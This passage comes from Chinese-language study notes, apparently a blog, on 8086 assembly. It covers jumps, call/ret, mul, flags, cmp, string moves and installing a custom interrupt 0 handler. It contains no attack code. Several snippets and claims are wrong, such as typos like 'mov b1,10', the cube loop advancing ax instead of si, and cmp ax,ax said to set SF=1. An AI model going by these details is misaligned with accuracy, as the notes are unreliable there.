[bx]</p>\n<p><code>jmp dword ptr 内存单元地址</code>    // 段间跳转，跳转时 IP 是高位，CS 是低位</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mov ax,0123H</span><br><span class=\"line\">mov [bx],ax</span><br><span class=\"line\">mov word ptr [bx+2],0</span><br><span class=\"line\">jmp dword ptr [bx]</span><br></pre></td></tr></table></figure>\n<p>jcxz 标号；有条件跳转指令</p>\n<p>IP 修改范围 - 128-127</p>\n<p>如果 cx=0，转移到标号处</p>\n<p>cx=0 时，IP 位移</p>\n<p>cx!=0 向下执行</p>\n<p>loop 标号</p>\n<p>转移范围 - 128-127，短转移</p>\n<p>cx=0 向下执行，cx！=0 转移到标号处</p>\n<h2 id=\"call和ret\"><a class=\"markdownIt-Anchor\" href=\"#call和ret\">#</a> call 和 ret</h2>\n<p>call 和 ret 都是转移指令，他们都修改 IP，或者同时修改 CS:IP</p>\n<p>ret 用栈中数据修改 IP 实现近转移</p>\n<p>IP = SS*16 + SP</p>\n<p>SP = SP + 2</p>\n<p>pop ip</p>\n<p>retf 修改 CS:IP 实现远转移</p>\n<p>IP = SS*16 + SP</p>\n<p>SP = SP + 2</p>\n<p>CS = ss*16 + SP</p>\n<p>(SP) = (SP) + 2</p>\n<p>pop ip</p>\n<p>pop cs</p>\n<p>call</p>\n<p>将 IP 或 CSIP 入栈，转移 (jmp)</p>\n<p>call 不能实现短转移</p>\n<p>call 标号   将当前 IP 压栈，转移到标号</p>\n<p>sp = sp -2</p>\n<p>ss*16 + sp = IP</p>\n<p>IP = IP + 位移 (16 位)</p>\n<p>相当于: push ip     +  jmp near ptr 标号</p>\n<p>call 只是将当前位置保存到栈了，其余和 jmp 一样</p>\n<p>call 16 位寄存器</p>\n<p>push IP</p>\n<p>jmp bx</p>\n<p>转移地址在内存中 call</p>\n<p>call word ptr 内存地址</p>\n<p>push IP   jmp word ptr 偏移地址</p>\n<p>call dword ptr 内存地址</p>\n<p>push cs   push IP   jmp dword ptr 内存单元地址</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mov sp,10h</span><br><span class=\"line\">mov ax,0123h</span><br><span class=\"line\">mov ds:[0],ax</span><br><span class=\"line\">mov word ptr ds:[2],0</span><br><span class=\"line\">call dword ptr ds:[0]</span><br><span class=\"line\"></span><br><span class=\"line\">---</span><br><span class=\"line\">此时ds中低位为0123(IP)，高位为0000(CS)</span><br><span class=\"line\">call结束后,cs=0,ip=0123,sp=0ch</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">assume cs:code</span><br><span class=\"line\">code segment</span><br><span class=\"line\">start: \tmov ax,1</span><br><span class=\"line\">\t\tmov cx,3</span><br><span class=\"line\">\t\tcall s</span><br><span class=\"line\">\t\tmov bx,ax  ;bx=8</span><br><span class=\"line\">\t\tmov ax,4c00h</span><br><span class=\"line\">\t\tint 21h</span><br><span class=\"line\">s:\t\tadd ax,ax</span><br><span class=\"line\">\t\tloop s</span><br><span class=\"line\">\t\tret</span><br><span class=\"line\">code ends</span><br><span class=\"line\">end start    ;实现2^n</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221028213345088.png\" alt=\"image-20221028213345088\"></p>\n<p>某种意义上来说，call 是调用，ret 是返回 (return)</p>\n<p>call 和 ret 要对应</p>\n<p>mul 指令</p>\n<p>相乘的两个数要么都是 8 要么都是 16</p>\n<p>8 位：AL 中或内存中</p>\n<p>16 位：AX 中或内存中</p>\n<p>结果：</p>\n<p>8 位：ax 中</p>\n<p>16 位：dx（高位），ax（低位）</p>\n<p>mul 寄存器</p>\n<p>mul 内存单元</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mul byte ptr ds:[0]</span><br><span class=\"line\">ax = al * (ds:[0])</span><br><span class=\"line\"></span><br><span class=\"line\">mul word ptr [bx+si+8]</span><br><span class=\"line\">ax=ax*([bx+si+8]) 低16位</span><br><span class=\"line\">dx=ax*([bx+si+8]) 高16位</span><br></pre></td></tr></table></figure>\n<p>100*10</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mov al,100</span><br><span class=\"line\">mov b1,10</span><br><span class=\"line\">mul bl</span><br></pre></td></tr></table></figure>\n<p>即需要将任意一个乘数放在 ax 或 al 中，另一个乘数放在空闲的通用寄存器中</p>\n<p>计算 n 的三次方</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cube:\tmov ax,bx</span><br><span class=\"line\">\t\tmul bx</span><br><span class=\"line\">\t\tmul bx</span><br><span class=\"line\">\t\tret</span><br></pre></td></tr></table></figure>\n<p>dw 的三次方放入 dw 中</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">assume cs:code,cs:data,ss:stack</span><br><span class=\"line\"></span><br><span class=\"line\">data segment</span><br><span class=\"line\">\tdw 1,2,3,4,5,6,7,8</span><br><span class=\"line\">\tdw 0,0,0,0,0,0,0,0</span><br><span class=\"line\">data ends</span><br><span class=\"line\"></span><br><span class=\"line\">code segment</span><br><span class=\"line\">start:\tmov ax,data</span><br><span class=\"line\">\t\tmov ds,ax</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tmov cx,8</span><br><span class=\"line\">\t\tmov si,0</span><br><span class=\"line\">s:\t\tmov bx,[si]  ;bx作为cube的参数</span><br><span class=\"line\">\t\tcall cube</span><br><span class=\"line\">\t\tmov [si+32],ax</span><br><span class=\"line\">\t\tadd ax,2</span><br><span class=\"line\">\t\tloop s</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tmov ax,4c00H</span><br><span class=\"line\">\t\tint 21H</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">cube:\tmov ax,bx\t</span><br><span class=\"line\">\t\tmul bx</span><br><span class=\"line\">\t\tmul bx</span><br><span class=\"line\">\t\tret</span><br><span class=\"line\"></span><br><span class=\"line\">code ends</span><br><span class=\"line\">end start</span><br></pre></td></tr></table></figure>\n<p>对于批量数据的传递，我们将它存在内存中，然后把首地址放在寄存器中</p>\n<p>判断是否以 0 结束，不是就转为大写</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">capital:mov cl:[si]</span><br><span class=\"line\">        mov ch,0</span><br><span class=\"line\">        jcxz ok</span><br><span class=\"line\">        and byte ptr[si],11011111b</span><br><span class=\"line\">        inc si</span><br><span class=\"line\">        jmp short capital</span><br></pre></td></tr></table></figure>\n<h2 id=\"标志寄存器\"><a class=\"markdownIt-Anchor\" href=\"#标志寄存器\">#</a> 标志寄存器</h2>\n<p>8086CPU 的标志客存器有 16 位，其中存储的信息通常被称为程序状态字 (PSW) 。</p>\n<p>标志寄存器结构：</p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221030202144281.png\" alt=\"image-20221030202144281\" style=\"zoom:67%;\" />\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221030205228119.png\" alt=\"image-20221030205228119\" style=\"zoom:67%;\" />\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221030205356183.png\" alt=\"image-20221030205356183\" style=\"zoom:67%;\" />\n<p>ZF</p>\n<p>零标志位，执行指令后如果结果为 0，zf=1</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mov ax,1</span><br><span class=\"line\">sub ax,1 </span><br><span class=\"line\">此时ZF=1</span><br></pre></td></tr></table></figure>\n<p>运算指令，大多数会影响 ZF 寄存器</p>\n<p>PF</p>\n<p>奇偶标志位，指令执行后，如果 1 的个数为偶数，PF=1</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mov al,1</span><br><span class=\"line\">add al,10</span><br><span class=\"line\">;00001011   PF=0  因为3个1</span><br></pre></td></tr></table></figure>\n<p>SF</p>\n<p>符号标志位，执行指令后，结果为负，SF=1</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mov al,10000001</span><br><span class=\"line\">add al,1</span><br><span class=\"line\">;可以当做无符号，130，有符号，-126</span><br></pre></td></tr></table></figure>\n<p>CF</p>\n<p>进位标志位，无符号运算标志位可能产生结果</p>\n<p>CF=NC 无进位，CF=CY 有进位，只记录上一条指令的变化</p>\n<p>not carry carry</p>\n<p>进位是更高位</p>\n<p>OF</p>\n<p>溢出标志位，有符号运算可能产生结果</p>\n<p>OF=OV 溢出  OF=NV 无溢出</p>\n<p>溢出是侵犯了符号位</p>\n<p><strong>当成有符号就看 OF 和 SF，当成无符号就看 CF</strong></p>\n<p>ADC</p>\n<p>带进位加法指令，利用了 CF 上进位值</p>\n<p>adc ax,bx   ;ax = ax + bx + cf</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mov ax,2</span><br><span class=\"line\">mov bx,1</span><br><span class=\"line\">sub bx,ax</span><br><span class=\"line\">adc ax,1</span><br><span class=\"line\">;ax=4 ax+1+cf=2+1+1=4</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mov al,98h</span><br><span class=\"line\">add al,al</span><br><span class=\"line\">adc al,3</span><br><span class=\"line\">;ax+3+cf = 30+3+1=34</span><br></pre></td></tr></table></figure>\n<p>加法分为两步</p>\n<p>1. 低位相加</p>\n<p>2. 高位相加，在加上低位相加产生的进位值</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">add ax,bx</span><br><span class=\"line\">===</span><br><span class=\"line\">add al,bl</span><br><span class=\"line\">adc ah,bh</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>就是那种 1EF000H+201000H</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">assume cs:code</span><br><span class=\"line\"></span><br><span class=\"line\">code segment</span><br><span class=\"line\">start:\tmov ax,01EFH  ;high</span><br><span class=\"line\">\t\tmov bx,0F00H  ;low </span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tmov cx,1000H  ;low</span><br><span class=\"line\">\t\tmov dx,0201H  ;high</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tadd bx,cx</span><br><span class=\"line\">\t\tadc ax,dx</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">cube:\tmov ax,bx\t</span><br><span class=\"line\">\t\tmul bx</span><br><span class=\"line\">\t\tmul bx</span><br><span class=\"line\">\t\tret</span><br><span class=\"line\"></span><br><span class=\"line\">code ends</span><br><span class=\"line\">end start</span><br></pre></td></tr></table></figure>\n<p>或者只用两个寄存器</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mov ax,001EH</span><br><span class=\"line\">mov bx,0F000H</span><br><span class=\"line\">add bx,1000H</span><br><span class=\"line\">adc ax,0020H</span><br></pre></td></tr></table></figure>\n<p>inc 和 loop 不影响 CF 的值，因此不能替换为 add ax,2</p>\n<p>sbb</p>\n<p>带进位减法指令</p>\n<p>sbb ax,bx</p>\n<p>ax = ax - bx - cf</p>\n<p>cmp</p>\n<p>功能类似于减法指令，但不保存结果，只对标志寄存器产生影响</p>\n<p>cmp ax,ax</p>\n<p>ax-ax ，不保存结果，只影响 flag，ZF=1,PF=1,SF=1,CF=0,OF=0</p>\n<p>cmp ax,bx</p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221031205029865.png\" alt=\"image-20221031205029865\" style=\"zoom:67%;\" />\n<p>cmp ax,ax</p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221031205427616.png\" alt=\"image-20221031205427616\" style=\"zoom:67%;\" />\n<p>cmp ah,bh 比较有符号数时，需要比较 SF 和 OF</p>\n<p>sf=1,of=0,ah&lt;bh</p>\n<p>SF=1,OF=1,ah&gt;bh</p>\n<p>SF=0,of=1,ah&lt;bh</p>\n<p>sf=0,of=0,ah&gt;=bh</p>\n<p>据无符号数的比较结果进行转移的条件转移指令，它们检测 ZF,CF 的值；</p>\n<p>和根据有符号数的比较结果进行转移的条件转移指令，它们检测 SF,OF ,ZF 的值・</p>\n<p>以下都是无符号指令比较时</p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221031210918994.png\" alt=\"image-20221031210918994\" style=\"zoom:67%;\" />\n<p>equal</p>\n<p>not equal</p>\n<p>below</p>\n<p>not below</p>\n<p>above</p>\n<p>not above</p>\n<p>ah=bh,ah=ah+ah,ah=ah+bh</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">assume cs:code</span><br><span class=\"line\"></span><br><span class=\"line\">code segment</span><br><span class=\"line\">start:\tmov ah,45h</span><br><span class=\"line\">\t\tmov bh 48h</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tcmp ah,bh</span><br><span class=\"line\">\t\tje s</span><br><span class=\"line\">\t\tadd ah,ah</span><br><span class=\"line\">\t\tjmp short ok</span><br><span class=\"line\">s:\t\tadd ah,ah</span><br><span class=\"line\">ok: \tret</span><br><span class=\"line\"></span><br><span class=\"line\">code ends</span><br><span class=\"line\">end start</span><br></pre></td></tr></table></figure>\n<p>cmp 和 je 等可以单独出现</p>\n<p>data 中是否小于 8，结果保存在 ax 中</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">assume cs:code,ds:data</span><br><span class=\"line\"></span><br><span class=\"line\">data segment</span><br><span class=\"line\">\tdb 1,2,3,4,5,6,7,8</span><br><span class=\"line\">data ends</span><br><span class=\"line\"></span><br><span class=\"line\">code segment</span><br><span class=\"line\">start:\tmov dx,data</span><br><span class=\"line\">\t\tmov ds,dx</span><br><span class=\"line\">\t\tmov ax,0</span><br><span class=\"line\">\t\tmov bx,0</span><br><span class=\"line\">\t\tmov cx,0</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">s0:\t\tcmp byte ptr [bx],8</span><br><span class=\"line\">\t\tjnb s</span><br><span class=\"line\">\t\tinc ax</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">s:\t\tinc bx</span><br><span class=\"line\">\t\tloop s0</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tmov ax,4c00h</span><br><span class=\"line\">\t\tint 21h</span><br><span class=\"line\"></span><br><span class=\"line\">code ends</span><br><span class=\"line\">end start</span><br></pre></td></tr></table></figure>\n<p>DF</p>\n<p>方向标志位，串处理指令中，控制 si，di 增减</p>\n<p>DF=0，si,di 递增</p>\n<p>DF=1，si,di 递减</p>\n<p>movsb</p>\n<p>以字节为单位传送</p>\n<p>1. <code>es*16 + di = ds*16+di</code></p>\n<p>2. 如果 df=0，si,di++</p>\n<p>如果 df=1，si,di–</p>\n<p>movsw</p>\n<p>和 movsb 一样，但 si 和 di 是以 2 递增或递减</p>\n<p>rep movsb</p>\n<p>rep movsw</p>\n<p>根据 cx 的值，重复后面的串传送指令</p>\n<p>循环实现 cx 个字符的传送，从 ds 送到 es</p>\n<p>cld：将 DF=0</p>\n<p>std：将 DF=1</p>\n<p>将 data 段的第一个字符串送到后面的空间</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">assume cs:code</span><br><span class=\"line\"></span><br><span class=\"line\">data segment</span><br><span class=\"line\">\tdb &#x27;welcome to masm!&#x27;</span><br><span class=\"line\">\tdb 16 dup (0)</span><br><span class=\"line\">data ends</span><br><span class=\"line\"></span><br><span class=\"line\">code segment</span><br><span class=\"line\">start:\tmov dx,data</span><br><span class=\"line\">\t\tmov ds,dx</span><br><span class=\"line\">\t\tmov es,dx</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tmov si,0</span><br><span class=\"line\">\t\tmov di,16</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tmov cx,16</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tcld</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\trep movsb</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tmov ax,4c00h</span><br><span class=\"line\">\t\tint 21h</span><br><span class=\"line\"></span><br><span class=\"line\">code ends</span><br><span class=\"line\">end start</span><br></pre></td></tr></table></figure>\n<p>pushf</p>\n<p>将标志寄存器压栈</p>\n<p>popf 从栈中弹出数据，送入标志寄存器</p>\n<p>比如</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">push ax</span><br><span class=\"line\">popf</span><br><span class=\"line\"></span><br><span class=\"line\">那么此时ax中就是标志寄存器中的值</span><br></pre></td></tr></table></figure>\n<p>如果学破解，到这边就可以跑路了</p>\n<hr>\n<hr>\n<hr>\n<h2 id=\"中断\"><a class=\"markdownIt-Anchor\" href=\"#中断\">#</a> 中断</h2>\n<p>中断分为硬件中断和软件中断</p>\n<p>硬件中断分为外部中断和内部中断</p>\n<p>内部中断是不可屏蔽的中断</p>\n<p>外部中断时可屏蔽的中断</p>\n<p>中断向量表</p>\n<p>CPU 用八位类型码通过中断向量表找到中断程序的入口地址</p>\n<p>中断向量表可以裂解为一个索引</p>\n<p>其中存放着 256 个中断源所对应的中断处理 程序入口</p>\n<p>8086 中，中断向量表在 0000:0000 - 0000:03FF 1024 个字节</p>\n<p>中断过程</p>\n<p>1. 取得中断类型码 N</p>\n<p>2.pushf</p>\n<p>3.TF=0，IF=0</p>\n<p>4.push cs</p>\n<p>5.push ip</p>\n<p>6. <code>(IP) = (N*4) , (CS) = (N*4+2)</code>    N*x 指的是在中断向量表中找 CS 和 IP</p>\n<p>中断处理步骤</p>\n<p>1. 保存用到的寄存器</p>\n<p>2. 处理中断</p>\n<p>3. 恢复用到的寄存器</p>\n<p>4. 用 iret 指令返回</p>\n<p>iret – pop ip  pop cs  popf</p>\n<p>中断寄存器入栈标志，CS，IP。iret 正好和他相反</p>\n<p>除法溢出，产生中断类型为 0</p>\n<p>我们是可以改变中断后处理的过程的</p>\n<p>改变 0 号中断处理程序</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">assume cs:code</span><br><span class=\"line\"></span><br><span class=\"line\">code segment</span><br><span class=\"line\">start:\t</span><br><span class=\"line\">\t\tmov ax, cs</span><br><span class=\"line\">\t\tmov ds, ax</span><br><span class=\"line\">\t\tmov si, offset do0\t\t;设置ds:si指向源地址</span><br><span class=\"line\">\t\tmov ax, 0</span><br><span class=\"line\">\t\tmov es, ax</span><br><span class=\"line\">\t\tmov di, 200h\t\t\t;设置es:di指向目的地址</span><br><span class=\"line\">\t\tmov cx, offset do0end - offset do0\t\t;设置cx为传输长度</span><br><span class=\"line\">\t\tcld\t\t\t\t        ;设置传输方向为正</span><br><span class=\"line\">\t\trep movsb</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tmov ax, 0               ;设置中断向量表</span><br><span class=\"line\">\t\tmov es, ax</span><br><span class=\"line\">\t\tmov word ptr es:[0*4], 200h</span><br><span class=\"line\">\t\tmov word ptr es:[0*4+2], 0</span><br><span class=\"line\"></span><br><span class=\"line\">      \tmov ax,4c00h</span><br><span class=\"line\">      \tint 21h</span><br><span class=\"line\"></span><br><span class=\"line\">do0:\tjmp short do0start</span><br><span class=\"line\">      \tdb &quot;Welcome to Fishc.com!&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">do0start:</span><br><span class=\"line\">      \tmov ax, cs</span><br><span class=\"line\">      \tmov ds, ax</span><br><span class=\"line\">      \tmov si, 202h\t\t\t;设置ds:si指向字符串</span><br><span class=\"line\"></span><br><span class=\"line\">      \tmov ax, 0b800h</span><br><span class=\"line\">      \tmov es, ax</span><br><span class=\"line\">\t\tmov di, 12*160+36*2\t\t;设置es:di指向显存空间的中间位置</span><br><span class=\"line\"></span><br><span class=\"line\">        mov cx, 21\t\t\t\t;设置cx为字符串长度</span><br><span class=\"line\">\ts:\tmov al, [si]</span><br><span class=\"line\">      \tmov es:[di], al</span><br><span class=\"line\">      \tinc si</span><br><span class=\"line\">      \tadd di, 1</span><br><span class=\"line\">\t\tmov al, 02h             ;设置颜色</span><br><span class=\"line\">\t\tmov es:[di], al        </span><br><span class=\"line\">\t\tadd di, 1</span><br><span class=\"line\">      \tloop s</span><br><span class=\"line\"></span><br><span class=\"line\">      \tmov ax, 4c00h</span><br><span class=\"line\">      \tint 21h</span><br><span class=\"line\">do0end:\tnop</span><br><span class=\"line\"></span><br><span class=\"line\">code ends</span><br><span class=\"line\">end start</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>单步中断</p>\n<p>CPU 在执行完一条指令之后，如果检到标志寄存器的 TF 位为 1，则产生单步中断，引发中断过程。</p>\n<p>但不中断类型码为 1</p>\n<p>中断过程：</p>\n<p>取得中断类型码 1</p>\n<p>TF=0 ,IF=0</p>\n<p>CS,IP 入栈</p>\n<p><code>IP=(1*4)  CS=(1*4+2)</code></p>\n<p>TF=1, 执行程一条指令后执行单步中断</p>\n<p>使用 t 命令是，debug 将 tf=1，执行完一条指令引发单步中断，显示寄存器，等待输入</p>\n<p>也有情况，即使发生中断，也不响应</p>\n<p>设置完 ss 后，即使中断，cpu 也不响应，因为 ss:sp 需要连续完成，不然 sp 指向的不是正确的栈顶</p>\n<p>我们利用这个特性，将 ss 和 sp 的设置指令连续存放</p>\n<p>mov ax,1000h</p>\n<p>mov ss,ax</p>\n<p>mov sp,0</p>\n<p>mov ax,10</p>\n<p>如果 ax=10 放在 sp 和 ss 中间，该指令不会被执行</p>\n<h2 id=\"int\"><a class=\"markdownIt-Anchor\" href=\"#int\">#</a> int</h2>\n<p>int n  n 为中断类型码，引发中断过程</p>\n<p>1. 取得类型码 n</p>\n<p>2.IF=0,TF=0</p>\n<p>3.CS,IP 入栈</p>\n<p><code>4.IP=(n*4)  